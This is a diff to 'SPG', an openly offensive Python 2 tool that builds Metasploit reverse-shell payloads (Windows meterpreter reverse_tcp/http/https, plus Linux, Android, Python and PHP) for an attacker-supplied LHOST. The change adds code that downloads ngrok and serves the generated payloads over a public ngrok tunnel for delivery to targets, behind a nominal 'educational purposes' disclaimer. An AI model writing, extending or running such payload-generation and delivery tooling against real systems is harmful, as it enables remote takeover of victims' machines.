@@ -3,7 +3,7 @@
 ################################################################################
 #                                                                              #
 #                                   SPG                                        #
-#                          Simple Payload Generaror                            #
+#                          Simple Payload Generator                            #
 #                             by: Assassin umz                                 #
 #                                                                              #
 # Follow me :                                                                  #
@@ -29,7 +29,8 @@
 #                                                                              #
 ################################################################################
 
-import os
+import os, platform, wget
+from SimpleHTTPServer import test
 from sys import exit
 from time import sleep
 
@@ -62,7 +63,7 @@ def head():
 def disclaimer():
     print('This tool was developed for learning purposes only and the use is complete responsibility of the end-user. Do you accept to cause no harm to any machine and use this tool for educational purposes only ? {0}(yes/no){1}').format(bold, end)
     if raw_input("\n{0}{1}SPG:~#{2} ".format(green, bold, end)) == 'yes':
-        print('{0}Proceeding...{1}').format(orange, end)
+        print('{0}Proceeding...{1}').format(green, end)
         sleep(1)
     else:
         print('{0}You must accept the terms and conditions to use this tool.{1}').format(red, end)
@@ -70,7 +71,7 @@ def disclaimer():
 
 def finish():
     head()
-    print('{0}Until next time...{1}').format(orange, end)
+    print('{0}Until next time...{1}').format(green, end)
     exit(0)
 
 def present():
@@ -79,9 +80,44 @@ def present():
         exit(0)
     if os.path.isdir('output') == False:
         head()
-        print('{0}Creating output directory{1}').format(orange, end)
+        print('{0}Creating output directory{1}').format(green, end)
         os.makedirs('output')
         sleep(1)
+    if os.path.isfile('ngrok') == False:
+        head()
+        print("{0}Downloading Ngrok...{1}").format(green, end)
+        if platform.architecture == "32bit":
+            wget.download('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.tgz')
+            os.system('tar -xf ngrok-stable-linux-386.tgz')
+            os.system('rm ngrok-stable-linux-386.tgz')
+        else:
+            wget.download('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz')
+            os.system('tar -xf ngrok-stable-linux-amd64.tgz')
+            os.system('rm ngrok-stable-linux-amd64.tgz')
+
+def server():
+    os.system('cd output/ && python -m SimpleHTTPServer 80')
+
+def ngrok():
+    head()
+    try:
+        os.system('./ngrok http 80 > /dev/null &')
+        sleep(5)
+        os.system('curl -s -N http://127.0.0.1:4040/status | grep "http://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
+        sleep(5)
+        url = open('ngrok.url', 'r')
+        print('\nNgrok Url:{0} ' + url.read() + '{1}').format(cyan, end)
+        os.system('cd output/ && python -m SimpleHTTPServer 80 &')
+        sleep(5)
+        raw_input('Hit {0}(Return){1} to stop the server and return back to Main Menu'.format(bold, end))
+        os.system('pkill -f "python -m SimpleHTTPServer 80"')
+        os.system('pkill -f ngrok')
+        url.close()
+        choosepayload()
+    except KeyboardInterrupt:
+        os.system('pkill -f "python -m SimpleHTTPServer 80"')
+        os.system('pkill -f ngrok')
+        finish()
 
 def main(platform, type):
     lhost = raw_input("\nEnter your LHOST\n{0}{1}SPG:~/LHOST#{2} ".format(green, bold, end))
@@ -144,16 +180,24 @@ def main(platform, type):
     sleep(3)
     if os.path.isfile('output/'+output+extension) == False:
         head()
-        raw_input('Failed to create payload, please try again. {0}(Hit Enter to continue){1}'.format(bold, end))
+        raw_input('{2}Failed to create payload, please try again.{1} {0}(Hit Enter to continue){1}'.format(bold, end, red))
         choosepayload()
     else:
-        head()
-        raw_input('Your payload has been sucessfully generated in the output directory {0}(Hit Enter to continue){1}'.format(bold, end))
-        choosepayload()
+        def server_start():
+            head()
+            http_server = raw_input('Your payload has been sucessfully generated in the output directory. Do you want to start Ngrok server now ? {1}(y/n){2}\n{0}{1}SPG:~#{2} '.format(green, bold, end))
+            if http_server == 'y' or http_server == 'Y':
+                ngrok()
+            elif http_server == 'n' or http_server == 'N':
+                choosepayload()
+            else:
+                raw_input('Please Choose a Valid option {0}(Hit Return to continue){1}'.format(bold, end))
+                server_start()
+        server_start()
 
 def choosepayload():
     head()
-    select = raw_input('{2}Choose a payload platform:{1}\n\n{0}[{1}1{0}]{1} Windows\n{0}[{1}2{0}]{1} Linux\n{0}[{1}3{0}]{1} Android\n{0}[{1}4{0}]{1} Python\n{0}[{1}5{0}]{1} PHP\n{0}[{1}0{0}]{1} Exit\n\n{0}{2}SPG:~#{1} '.format(green, end, bold))
+    select = raw_input('{2}Choose a payload platform:{1}\n\n{0}[{1}1{0}]{1} Windows\n{0}[{1}2{0}]{1} Linux\n{0}[{1}3{0}]{1} Android\n{0}[{1}4{0}]{1} Python\n{0}[{1}5{0}]{1} PHP\n{0}[{1}6{0}]{1} Start Ngrok Server\n{0}[{1}0{0}]{1} Exit\n\n{0}{2}SPG:~#{1} '.format(green, end, bold))
     if select == '1':
         head()
         type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} windows/meterpreter/reverse_http\n{0}[{1}2{0}]{1} windows/meterpreter/reverse_https\n{0}[{1}3{0}]{1} windows/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}SPG:~/Windows#{1} '.format(green, end, bold))
@@ -184,6 +228,8 @@ def choosepayload():
         if type == '0':
             choosepayload()
         main('PHP', type)
+    elif select == '6':
+        ngrok()
     elif select == '0':
         finish()
     else:
